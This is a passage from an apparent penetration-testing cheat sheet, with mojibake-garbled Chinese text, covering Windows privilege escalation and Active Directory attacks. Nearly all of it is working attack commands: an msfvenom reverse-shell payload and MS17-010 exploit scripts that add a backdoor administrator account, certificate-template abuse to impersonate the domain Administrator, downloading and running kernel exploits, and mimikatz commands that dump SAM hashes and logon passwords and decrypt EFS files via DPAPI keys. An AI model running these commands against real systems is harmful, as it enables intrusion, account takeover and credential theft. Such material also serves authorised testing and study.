class="hljs-built_in">cd</span> MS17<span class="hljs-literal">-010</span><br>virtualenv <span class="hljs-literal">-p</span> python2 venv<br>source venv/bin/activate<br>pip2 install impacket pycrypto <span class="hljs-comment"># è¿™å°†å¾—åˆ°ä¸€ä¸ªé”™è¯¯ï¼›é‚£å¾ˆå¥½</span><br>python checker.py &lt;IP&gt;<br>msfvenom <span class="hljs-literal">-p</span> windows/shell_reverse_tcp LHOST=&lt;YourIP&gt; LPORT=<span class="hljs-number">4545</span> <span class="hljs-operator">-f</span> exe &gt; rev.exe<br><br><span class="hljs-comment">## ------------------| æ–¹æ³•ä¸€</span><br>python send_and_execute.py &lt;IP&gt; rev.exe<br><br><span class="hljs-comment">## ------------------| æ–¹æ³•äºŒ</span><br><span class="hljs-comment">## æ‰“å¼€ zzz_exploit.py æ–‡ä»¶å¹¶ç¼–è¾‘ä»¥ä¸‹è¡Œ</span><br>service_exec(conn, <span class="hljs-built_in">r</span><span class="hljs-string">&#x27;cmd /c net user h4rithd Password123 /add&#x27;</span>)<br>service_exec(conn, <span class="hljs-built_in">r</span><span class="hljs-string">&#x27;cmd /c net localgroup administrators h4rithd /add&#x27;</span>)<br>python zzz_exploit.py &lt;IP&gt;<br></code></pre></td></tr></table></figure>

<h3 id="03-10-è¯ä¹¦æ¨¡æ¿é…ç½®é”™è¯¯"><a href="#03-10-è¯ä¹¦æ¨¡æ¿é…ç½®é”™è¯¯" class="headerlink" title="03.10 è¯ä¹¦æ¨¡æ¿é…ç½®é”™è¯¯"></a>03.10 è¯ä¹¦æ¨¡æ¿é…ç½®é”™è¯¯</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## --------------------| Using Certipy-Ad</span><br>sudo apt install certipy<span class="hljs-literal">-ad</span><br><span class="hljs-comment">## æŸ¥æ‰¾æ˜“å—æ”»å‡»çš„è¯ä¹¦æ¨¡æ¿</span><br>certipy<span class="hljs-literal">-ad</span> find <span class="hljs-literal">-u</span> &lt;USER&gt; <span class="hljs-literal">-p</span> &lt;Password&gt; <span class="hljs-literal">-dc-ip</span> &lt;IP&gt;<br>certipy<span class="hljs-literal">-ad</span> find <span class="hljs-literal">-u</span> &lt;USER&gt;<span class="hljs-selector-tag">@</span>&lt;DOMAIN&gt; <span class="hljs-literal">-p</span> &lt;Password&gt; <span class="hljs-literal">-dc-ip</span> &lt;IP&gt;<br><span class="hljs-comment">## Exploit</span><br>certipy<span class="hljs-literal">-ad</span> req <span class="hljs-string">&#x27;&lt;USER&gt;@&lt;DOMAIN&gt;:&lt;Password&gt;@&lt;IP&gt;&#x27;</span> <span class="hljs-literal">-ca</span> <span class="hljs-string">&#x27;&lt;CA Name&gt;&#x27;</span> <span class="hljs-literal">-template</span> <span class="hljs-string">&#x27;&lt;Template Name&gt;&#x27;</span> <span class="hljs-literal">-alt</span> <span class="hljs-string">&#x27;administrator@&lt;Domain&gt;&#x27;</span><br>certipy<span class="hljs-literal">-ad</span> auth <span class="hljs-literal">-pfx</span> administrator.pfx <span class="hljs-literal">-dc-ip</span> &lt;IP&gt; <span class="hljs-literal">-username</span> Administrator <span class="hljs-literal">-domain</span> &lt;Domain&gt;<br>impacket<span class="hljs-literal">-psexec</span> administrator<span class="hljs-selector-tag">@</span>&lt;IP&gt; <span class="hljs-literal">-hashes</span> &lt;HASH&gt;:&lt;HASH&gt;<br><br><span class="hljs-comment">## --------------------| Using Certify.exe</span><br><span class="hljs-built_in">wget</span> https://github.com/h4rithd/PrecompiledBinaries/raw/main/Certify/Certify.exe<br>./certify.exe find /vulnerable<br>./certify.exe request /ca:&lt;CA Name&gt; /template:&lt;Template Name&gt; /altname:Administrator             <br>openssl pkcs12 <span class="hljs-operator">-in</span> cert.pem <span class="hljs-literal">-keyex</span> <span class="hljs-literal">-CSP</span> <span class="hljs-string">&quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;</span> <span class="hljs-literal">-export</span> <span class="hljs-literal">-out</span> cert.pfx           <br><br><span class="hljs-comment">## --------------------| Methord II</span><br>./certify.exe find /vulnerable<br>impacket<span class="hljs-literal">-addcomputer</span> &lt;Domain&gt;/&lt;Username&gt;:<span class="hljs-string">&#x27;&lt;Password&gt;!&#x27;</span> <span class="hljs-literal">-computer-name</span> <span class="hljs-string">&#x27;HD$&#x27;</span> <span class="hljs-literal">-computer-pass</span> <span class="hljs-string">&#x27;Password123!&#x27;</span><br>ntpdate <span class="hljs-literal">-s</span> &lt;IP&gt;<br>certipy<span class="hljs-literal">-ad</span> req <span class="hljs-literal">-u</span> <span class="hljs-string">&#x27;HD$&#x27;</span> <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;Password123!&#x27;</span> <span class="hljs-literal">-ca</span> &lt;CA Name&gt; <span class="hljs-literal">-target</span> &lt;Domain&gt; <span class="hljs-literal">-template</span> &lt;Template Name&gt; <span class="hljs-literal">-upn</span> administrator<span class="hljs-selector-tag">@</span>&lt;Domain&gt; <span class="hljs-literal">-dns</span> &lt;Domain&gt; <span class="hljs-literal">-dc-ip</span> &lt;IP&gt;<br>certipy<span class="hljs-literal">-ad</span> cert <span class="hljs-literal">-pfx</span> administrator_authority.pfx <span class="hljs-literal">-nokey</span> <span class="hljs-literal">-out</span> user.crt<br>certipy<span class="hljs-literal">-ad</span> cert <span class="hljs-literal">-pfx</span> administrator_authority.pfx <span class="hljs-literal">-nocert</span> <span class="hljs-literal">-out</span> user.key<br><span class="hljs-built_in">wget</span> https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/main/Python/passthecert.py<br>python3 passthecert.py <span class="hljs-literal">-action</span> ldap<span class="hljs-literal">-shell</span> <span class="hljs-literal">-crt</span> user.crt <span class="hljs-literal">-key</span> user.key <span class="hljs-literal">-domain</span> &lt;Domain&gt; <span class="hljs-literal">-dc-ip</span> <span class="hljs-variable">$IP</span><br></code></pre></td></tr></table></figure>

<h3 id="03-11-Windows-Exploit-Suggester-WES-NG"><a href="#03-11-Windows-Exploit-Suggester-WES-NG" class="headerlink" title="03.11 Windows-Exploit-Suggester WES-NG"></a>03.11 <a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">Windows-Exploit-Suggester WES-NG</a></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Install</span><br>git clone https://github.com/bitsadmin/wesng.git<br><span class="hljs-built_in">cd</span> wesng<br>chmod +x wes.py<br><br><span class="hljs-comment">## ------------------| Download latest definitions</span><br>./wes.py <span class="hljs-literal">--update</span><br>./wes.py <span class="hljs-literal">-u</span><br><br><span class="hljs-comment">## ------------------| Download latest version of WES-NG</span><br>./wes.py <span class="hljs-literal">--update-wes</span><br><br><span class="hljs-comment">## ------------------| ç¡®å®šæ¼æ´</span><br>./wes.py systeminfo.txt<br><br><span class="hljs-comment">## ------------------| ä½¿ç”¨systeminfoå’Œqfeæ–‡ä»¶ç¡®å®šæ¼æ´</span><br>./wes.py systeminfo.txt qfe.txt<br><br><span class="hljs-comment">## ------------------| ç¡®å®šæ¼æ´å¹¶è¾“å‡ºåˆ°æ–‡ä»¶</span><br>./wes.py systeminfo.txt <span class="hljs-literal">--output</span> vulns.csv<br>./wes.py systeminfo.txt <span class="hljs-literal">-o</span> vulns.csv<br><br><span class="hljs-comment">## ------------------| ç¡®å®šæ˜ç¡®æŒ‡å®šKBä»¥å‡å°‘è¯¯æŠ¥çš„æ¼æ´</span><br>./wes.py systeminfo.txt <span class="hljs-literal">--patches</span> KB4345421 KB4487017<br>./wes.py systeminfo.txt <span class="hljs-literal">-p</span> KB4345421 KB4487017<br><br><span class="hljs-comment">## ------------------| ç¡®å®šç­›é€‰å‡ºåœ¨æœ€è¿‘å®‰è£…çš„KBçš„å‘å¸ƒæ—¥æœŸä¹‹å‰å‘å¸ƒçš„KBçš„æ¼æ´çš„æ¼æ´</span><br>./wes.py systeminfo.txt <span class="hljs-literal">--usekbdate</span><br>./wes.py systeminfo.txt <span class="hljs-literal">-d</span><br><br><span class="hljs-comment">## ------------------| ç¡®å®šæ˜ç¡®æŒ‡å®šå®šä¹‰æ–‡ä»¶çš„æ¼æ´</span><br>./wes.py systeminfo.txt <span class="hljs-literal">--definitions</span> C:\tmp\mydefs.zip<br><br><span class="hljs-comment">## ------------------| ä»…åˆ—å‡ºåˆ©ç”¨æ¼æ´çš„æ¼æ´ï¼Œä¸åŒ…æ‹¬IEã€Edgeå’ŒFlash</span><br>./wes.py systeminfo.txt <span class="hljs-literal">--exploits-only</span> <span class="hljs-literal">--hide</span> <span class="hljs-string">&quot;Internet Explorer&quot;</span> Edge Flash<br>./wes.py systeminfo.txt <span class="hljs-literal">-e</span> <span class="hljs-literal">--hide</span> <span class="hljs-string">&quot;Internet Explorer&quot;</span> Edge Flash<br><br><span class="hljs-comment">## ------------------| ä»…æ˜¾ç¤ºå…·æœ‰ä¸€å®šå½±å“çš„æ¼æ´</span><br>./wes.py systeminfo.txt <span class="hljs-literal">--impact</span> <span class="hljs-string">&quot;Remote Code Execution&quot;</span><br>./wes.py systeminfo.txt <span class="hljs-literal">-i</span> <span class="hljs-string">&quot;Remote Code Execution&quot;</span><br><br><span class="hljs-comment">## ------------------| ä»…æ˜¾ç¤ºç‰¹å®šä¸¥é‡æ€§çš„æ¼æ´</span><br>./wes.py systeminfo.txt <span class="hljs-literal">--severity</span> critical<br>./wes.py systeminfo.txt <span class="hljs-literal">-s</span> critical<br><br><span class="hljs-comment">## ------------------| æ ¹æ®Microsoftçš„è”æœºæ›´æ–°ç›®å½•éªŒè¯æ›¿ä»£æ€§</span><br>./wes.py systeminfo.txt <span class="hljs-literal">--muc-lookup</span><br></code></pre></td></tr></table></figure>

<h3 id="03-11-Windows-å†…æ ¸æ¼æ´åˆ©ç”¨"><a href="#03-11-Windows-å†…æ ¸æ¼æ´åˆ©ç”¨" class="headerlink" title="03.11 Windows å†…æ ¸æ¼æ´åˆ©ç”¨"></a>03.11 Windows å†…æ ¸æ¼æ´åˆ©ç”¨</h3><p><strong>ä»ä»¥ä¸‹ä½ç½®ä¸‹è½½æ‰€æœ‰äºŒè¿›åˆ¶æ–‡ä»¶ï¼š</strong> <a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
<h4 id="Microsoft-Windows-æœ¬åœ°æƒé™å‡çº§-MS15-051"><a href="#Microsoft-Windows-æœ¬åœ°æƒé™å‡çº§-MS15-051" class="headerlink" title="Microsoft Windows - æœ¬åœ°æƒé™å‡çº§ (MS15-051)"></a>Microsoft Windows - æœ¬åœ°æƒé™å‡çº§ (MS15-051)</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">wget</span> https://github.com/SecWiki/windows<span class="hljs-literal">-kernel-exploits</span>/raw/master/MS15<span class="hljs-literal">-051</span>/MS15<span class="hljs-literal">-051-KB3045171</span>.zip<br></code></pre></td></tr></table></figure>

<h4 id="USBPcapç©ºæŒ‡é’ˆå–æ¶ˆå¼•ç”¨æƒé™å‡çº§-CVE-2017-6178"><a href="#USBPcapç©ºæŒ‡é’ˆå–æ¶ˆå¼•ç”¨æƒé™å‡çº§-CVE-2017-6178" class="headerlink" title="USBPcapç©ºæŒ‡é’ˆå–æ¶ˆå¼•ç”¨æƒé™å‡çº§ (CVE-2017-6178)"></a><code>USBPcap</code>ç©ºæŒ‡é’ˆå–æ¶ˆå¼•ç”¨æƒé™å‡çº§ (CVE-2017-6178)</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Information</span><br><span class="hljs-comment"># Date             - 07th March 2017</span><br><span class="hljs-comment"># Discovered by    - Parvez Anwar (@parvezghh)</span><br><span class="hljs-comment"># Vendor Homepage  - http://desowin.org/usbpcap/ </span><br><span class="hljs-comment"># Tested Version   - 1.1.0.0  (USB Packet capture for Windows bundled with WireShark 2.2.5)</span><br><span class="hljs-comment"># Driver Version   - 1.1.0.0 - USBPcap.sys</span><br><span class="hljs-comment"># Tested on OS     - 32bit Windows 7 SP1 </span><br><span class="hljs-comment"># Vendor fix url   - not yet</span><br><span class="hljs-comment"># Fixed Version    - 0day</span><br><span class="hljs-comment"># Fixed driver ver - 0day</span><br><br><span class="hljs-comment">## ------------------| Check Vulnarable Version   </span><br>driverquery /v | findstr USBPcap.sys<br><span class="hljs-built_in">type</span> <span class="hljs-string">&quot;C:\Program Files\USBPcap\USBPcap.inf&quot;</span><br><br><span class="hljs-comment">## ------------------| Exploit</span><br><span class="hljs-built_in">curl</span> <span class="hljs-literal">-o</span> exploit.c https://www.exploit<span class="hljs-literal">-db</span>.com/raw/<span class="hljs-number">41542</span><br>gcc.exe <span class="hljs-literal">-c</span> exploit.exe exploit.c<br>./exploit.exe<br></code></pre></td></tr></table></figure>

<h2 id="04-mimikatz"><a href="#04-mimikatz" class="headerlink" title="04.mimikatz"></a>04.<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20210810-2">mimikatz</a></h2><ul>
<li><p>æ›´å¤šå‘½ä»¤å¯ä»¥åœ¨<a target="_blank" rel="noopener" href="https://docs.h4rithd.com/windows/smb-ad-enumeration#18.-mimikatz">è¿™é‡Œä½¿ç”¨ï¼</a></p>
</li>
<li><p><code>ntlm</code>ä½¿ç”¨è½¬å‚¨æ‰€æœ‰ç”¨æˆ·çš„å“ˆå¸Œå€¼<code>lsass</code></p>
</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell">.\mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;token::elevate&quot;</span> <span class="hljs-string">&quot;lsadump::sam&quot;</span> <span class="hljs-string">&quot;exit&quot;</span> &gt;&gt; mimikatz<span class="hljs-literal">-sam</span>.out <br>.\mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-string">&quot;exit&quot;</span> &gt;&gt; mimikatz<span class="hljs-literal">-logonpasswords</span>.out       <br><br><span class="hljs-comment">## ------------------| å¦‚æœä½ æœ‰lsassä½œä¸ºè¿·ä½ DuMPæˆ–Rekall</span><br>pip3 install pypykatz<br>pypykatz lsa minidump lsass.DMP <span class="hljs-literal">--json</span><br></code></pre></td></tr></table></figure>

<ul>
<li>è®¾ç½®è´¦æˆ·å¯†ç </li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">.\mimikatz.exe <span class="hljs-string">&quot;lsadump::setntlm /user:USERNAME /ntlm:NTLMHASH&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>

<ul>
<li>è§£å¯† EFS æ–‡ä»¶ã€‚ [<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files">æ¥æº</a>]</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| è·å–æ–‡ä»¶çš„è¯ä¹¦æŒ‡çº¹å€¼</span><br>cipher /c c:\users\file.txt | <span class="hljs-built_in">Select-String</span> <span class="hljs-string">&quot;Certificate thumbprint&quot;</span><br><span class="hljs-comment">## æ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è·å¾—æ­¤ä¿¡æ¯ã€‚</span><br><span class="hljs-built_in">dir</span> C:\Users\&lt;UserName&gt;\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\ | <span class="hljs-built_in">Select</span> Name  <br><br><span class="hljs-comment">## ------------------| æ­£åœ¨è·å–è¯ä¹¦</span><br>.\mimikatz.exe <span class="hljs-string">&quot;crypto::system /file:C:\Users\&lt;UserName&gt;\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\&lt;Certificate_Thumbprint&gt; /export&quot;</span> <span class="hljs-string">&quot;exit&quot;</span>    <br><span class="hljs-comment">## å°†*.deræ–‡ä»¶ä¸‹è½½åˆ°æ‚¨çš„è®¡ç®—æœºä¸Šã€‚</span><br><br><span class="hljs-comment">## ------------------| è·å–ä¸‡èƒ½é’¥åŒ™</span><br><span class="hljs-built_in">gci</span> C:\Users\tolu\AppData\Roaming\Microsoft\protect\<br><span class="hljs-built_in">gci</span> <span class="hljs-literal">-hidden</span> C:\Users\tolu\AppData\Roaming\Microsoft\protect\&lt;SID_VALUE&gt;\<br>.\mimikatz.exe <span class="hljs-string">&quot;dpapi::masterkey /in:C:\Users\&lt;UserName&gt;\AppData\Roaming\Microsoft\protect\&lt;SID_VALUE&gt;\&lt;FileName&gt; /password:&lt;UserPassword&gt;&quot;</span> <span class="hljs-string">&quot;exit&quot;</span>     <br><br><span class="hljs-comment">## ------------------| è§£å¯†ç§é’¥</span><br><span class="hljs-built_in">gci</span> C:\Users\&lt;UserName&gt;\AppData\Roaming\Microsoft\Crypto\RSA\<br><span class="hljs-built_in">gci</span> C:\Users\&lt;UserName&gt;\AppData\Roaming\Microsoft\Crypto\RSA\&lt;SID_VALUE&gt;\<br>.\mimikatz.exe <span class="hljs-string">&quot;dpapi::capi /in:C:\Users\&lt;UserName&gt;\AppData\Roaming\Microsoft\Crypto\RSA\&lt;SID_VALUE\&lt;FILE&gt; /masterkey:&lt;SHA-1&gt;&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br><span class="hljs-comment">## å°†*.pvkæ–‡ä»¶ä¸‹è½½åˆ°æ‚¨çš„è®¡ç®—æœºä¸Šã€‚</span><br><br><span class="hljs-comment">## ------------------| æ„å»ºå’Œå®‰è£…æ­£ç¡®çš„PFX</span><br>openssl x509 <span class="hljs-literal">-inform</span> DER <span class="hljs-literal">-outform</span> PEM <span class="hljs-operator">-in</span> *.der <span class="hljs-literal">-out</span> public.pem<br>openssl rsa <span class="hljs-literal">-inform</span> PVK <span class="hljs-literal">-outform</span> PEM <span class="hljs-operator">-in</span> *.pvk <span class="hljs-literal">-out</span> private.pem<br>openssl pkcs12 <span class="hljs-operator">-in</span> public.pem <span class="hljs-literal">-inkey</span> private.pem <span class="hljs-literal">-password</span> pass:&lt;NewPassword&gt; <span class="hljs-literal">-keyex</span> <span class="hljs-literal">-CSP</span> <span class="hljs-string">&quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;</span> <span class="hljs-literal">-export</span> <span class="hljs-literal">-out</span> cert.pfx       <br><span class="hljs-comment">## å°†cert.pfxæ–‡ä»¶å¤åˆ¶åˆ°è¿œç¨‹è®¡ç®—æœºã€‚</span><br>certutil <span class="hljs-literal">-user</span> <span class="hljs-literal">-p</span> &lt;NewPassword&gt; <span class="hljs-literal">-importpfx</span> cert.pfx NoChain,NoRoot<br><br><span class="hljs-comment">## ------------------| Data access</span><br><span class="hljs-built_in">type</span> <span class="hljs-string">&quot;c:\users\file.txt&quot;</span><br></code></pre></td></tr></table></figure>

<h2 id="05-æ£€æŸ¥æé†’æ¸…å•"><a href="#05-æ£€æŸ¥æé†’æ¸…å•" class="headerlink" title="05.æ£€æŸ¥æé†’æ¸…å•"></a>05.æ£€æŸ¥æé†’æ¸…å•</h2><h3 id="ç›®å½•"><a href="#ç›®å½•" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h3><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Kargha/CyberSec-Notes/blob/main/PrivEsc%20-%20Windows.md#checklist">æ¸…å•</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Kargha/CyberSec-Notes/blob/main/PrivEsc%20-%20Windows.md#enumeration-tools">æšä¸¾å·¥å…·</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Kargha/CyberSec-Notes/blob/main/PrivEsc%20-%20Windows.md#kernel-exploits">å†…æ ¸æ¼æ´</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Kargha/CyberSec-Notes/blob/main/PrivEsc%20-%20Windows.md#service-exploits">æœåŠ¡æ¼æ´</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Kargha/CyberSec-Notes/blob/main/PrivEsc%20-%20Windows.md#registry">ç™»è®°å¤„</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Kargha/CyberSec-Notes/blob/main/PrivEsc%20-%20Windows.md#passwords">å¯†ç </a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Kargha/CyberSec-Notes/blob/main/PrivEsc%20-%20Windows.md#scheduled-tasks">è®¡åˆ’ä»»åŠ¡</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Kargha/CyberSec-Notes/blob/main/PrivEsc%20-%20Windows.md#insecure-gui-applications">ä¸å®‰å…¨çš„ GUI åº”ç”¨ç¨‹åº</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Kargha/CyberSec-Notes/blob/main/PrivEsc%20-%20Windows.md#token-impersonation">ä»¤ç‰Œæ¨¡æ‹Ÿ</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Kargha/CyberSec-Notes/blob/main/PrivEsc%20-%20Windows.md#software-vulnerabilities">è½¯ä»¶æ¼æ´</a></li>
</ul>
<hr>
<h3 id="æ¸…å•"><a href="#æ¸…å•" class="headerlink" title="æ¸…å•"></a>æ¸…å•</h3><ul>
<li><input disabled="" type="checkbox"> whoami &#x2F;privï¼ˆSeImpersonatePrivileges æˆ– SeAssignPrimaryToken &#x3D;&#x3D; WINï¼‰</li>
<li><input disabled="" type="checkbox"> ç³»ç»Ÿä¿¡æ¯</li>
<li><input disabled="" type="checkbox"> winPEAS</li>
<li><input disabled="" type="checkbox"> å…¶ä»–</li>
</ul>
<hr>
<h3 id="æšä¸¾å·¥å…·"><a href="#æšä¸¾å·¥å…·" class="headerlink" title="æšä¸¾å·¥å…·"></a>æšä¸¾å·¥å…·</h3><p>å¯¹äºæšä¸¾ï¼Œé¦–å…ˆä½¿ç”¨WinPEASã€‚å°½é‡é¿å…è€ƒè¯•æ—¶ PowerUpï¼ä½†å¦‚æœä½¿ç”¨ï¼Œè¯·ç¡®ä¿ä¸è¦ä½¿ç”¨ä»»ä½•è‡ªåŠ¨åˆ©ç”¨è„šæœ¬ï¼</p>
<h4 id="powerup"><a href="#powerup" class="headerlink" title="powerup"></a>powerup</h4><p>é¦–å…ˆåŠ è½½è„šæœ¬ï¼š<code>Import-Module ./PowerUp.ps1</code></p>
<p>ç„¶åè¿è¡Œæ‰€æœ‰æ£€æŸ¥ï¼š<code>Invoke-AllChecks</code></p>
<h4 id="SharpUp"><a href="#SharpUp" class="headerlink" title="SharpUp"></a>SharpUp</h4><p><code>.\SharpUp.exe</code></p>
<h4 id="Seatbelt"><a href="#Seatbelt" class="headerlink" title="Seatbelt"></a>Seatbelt</h4><p>æ¥æºï¼š<a target="_blank" rel="noopener" href="https://github.com/GhostPack/Seatbelt">https://github.com/GhostPack/Seatbelt</a>Â é¢„ç¼–è¯‘ï¼š<a target="_blank" rel="noopener" href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe</a></p>
<p>è¿è¡Œæ‰€æœ‰æ£€æŸ¥ï¼š<code>.\Seatbelt.exe all</code>Â æˆ–å•ç‹¬æ£€æŸ¥ï¼š<code>.\Seatbelt.exe &lt;check&gt; &lt;check&gt; &lt;...&gt;</code></p>
<h4 id="winPEAS"><a href="#winPEAS" class="headerlink" title="winPEAS"></a>winPEAS</h4><p>ç¬¬ä¸€æ¬¡è¿è¡Œ<code>reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1</code></p>
<p>æ‰€æœ‰ï¼ˆå¿«é€Ÿï¼‰æ£€æŸ¥ï¼š<code>.\winPEASany.exe quiet cmd fast</code>Â å…·ä½“ç±»åˆ«ï¼š<code>.\winPEASany.exe quiet cmd systeminfo</code></p>
<h4 id="è®¿é—®æ£€æŸ¥"><a href="#è®¿é—®æ£€æŸ¥" class="headerlink" title="è®¿é—®æ£€æŸ¥"></a>è®¿é—®æ£€æŸ¥</h4><p>å³å°†æ¨å‡ºâ€¦</p>
<hr>
<h3 id="å†…æ ¸æ¼æ´"><a href="#å†…æ ¸æ¼æ´" class="headerlink" title="å†…æ ¸æ¼æ´"></a>å†…æ ¸æ¼æ´</h3><h4 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h4><p>WESï¼ˆWindows æ¼æ´åˆ©ç”¨å»ºè®®å™¨ï¼‰ï¼š<a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a>Â é¢„ç¼–è¯‘æ¼æ´ï¼š<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a>Â Watsonï¼š<a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Watson">https://github.com/rasta-é¼ æ ‡/æ²ƒæ£®</a></p>
<h4 id="æƒé™æå‡ç¤ºä¾‹ï¼ˆWin7ï¼‰"><a href="#æƒé™æå‡ç¤ºä¾‹ï¼ˆWin7ï¼‰" class="headerlink" title="æƒé™æå‡ç¤ºä¾‹ï¼ˆWin7ï¼‰"></a>æƒé™æå‡ç¤ºä¾‹ï¼ˆWin7ï¼‰</h4><ol>
<li>åœ¨ Windows æœºå™¨ä¸Šï¼Œè¿è¡Œï¼š</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs batchfile">systeminfo &gt; \\my.kali.ip.here\SHARE\systeminfo.txt<br></code></pre></td></tr></table></figure>

<ol start="2">
<li>ç„¶ååœ¨ Kali ä¸Šï¼Œæ‚¨å¯ä»¥åœ¨ systeminfo.txt ä¸Šè¿è¡Œ wesng</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python wes.py systeminfo.txt -i &#x27;Elevation of Privilege&#x27; --exploits-only | less<br></code></pre></td></tr></table></figure>

<ol start="3">
<li><p>ä¸ SecWiki ä¸Šå·²ç¼–è¯‘çš„æ¼æ´äº¤å‰å¼•ç”¨ç»“æœ</p>
</li>
<li><p>ä» msfvenom è¿è¡Œåå‘ shell æœ‰æ•ˆè´Ÿè½½ä½œä¸ºå·²ç¼–è¯‘æ¼æ´çš„å‚æ•°ã€‚</p>
</li>
</ol>
<hr>
